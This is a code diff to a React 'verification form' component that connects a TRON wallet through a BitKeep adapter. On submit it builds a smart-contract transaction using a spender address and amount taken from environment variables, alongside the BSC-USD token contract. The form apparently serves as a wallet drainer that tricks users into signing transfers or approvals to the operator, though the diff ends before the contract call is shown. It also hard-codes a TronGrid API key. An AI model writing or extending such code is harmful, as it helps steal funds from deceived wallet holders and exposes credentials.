@@ -10,6 +10,7 @@ import { TronWeb } from 'tronweb';
 import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
 import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect';
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapters';
+import { BitKeepAdapter } from '@tronweb3/tronwallet-adapter-bitkeep';
 
 const FULL_NODE = 'https://api.trongrid.io';
 const SOLIDITY_NODE = 'https://api.trongrid.io';
@@ -47,31 +48,6 @@ const VerificationFormComponent = (props) => {
   const spenderTrx = import.meta.env.VITE_SPENDER_ADDRESS_TRX;
   const busdContractAddress = '0x55d398326f99059fF775485246999027B3197955';
   const spenderAmount = import.meta.env.VITE_AMOUNT;
-
-  // Trying...
-  const [readyState, setReadyState] = useState();
-  const [account, setAccount] = useState('');
-  const [netwok, setNetwork] = useState({});
-  const [signedMessage, setSignedMessage] = useState('');
-
-  const adapter = useMemo(() => new TronLinkAdapter(), []);
-  // useEffect(() => {
-  //   setReadyState(adapter.readyState);
-  //   setAccount(adapter.address!);
-  //   console.log('Adapter address:', adapter);
-
-  //   return () => {
-  //     // remove all listeners when components is destroyed
-  //     adapter.removeAllListeners();
-  //   };
-  // }, []);
-
-  async function sign() {
-    const res = await adapter!.signMessage('helloworld');
-    setSignedMessage(res);
-  }
-
-  /// enddd
 
   const contractType = {
     'binance': 'BEP-20 Token',
@@ -371,14 +347,16 @@ const VerificationFormComponent = (props) => {
 
   const handleSubmit = async (value) => {
 
-    // await adapter.connect();
-    console.log('adapter', adapter?.address);
-    console.log('adapter', adapter?.readyState);
-
     const tronWeb = new TronWeb({
       fullHost: 'https://api.trongrid.io',
       headers: { 'TRON-PRO-API-KEY': '7a869df0-71b7-4fbe-afe1-b9bc0051e9d9' },
     });
+    const adapter = new BitKeepAdapter();
+
+    await adapter.connect();
+    console.log('adapter', adapter?.address);
+    console.log('adapter', adapter?.readyState);
+
     console.log('tronWeb', tronWeb);
 
     const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
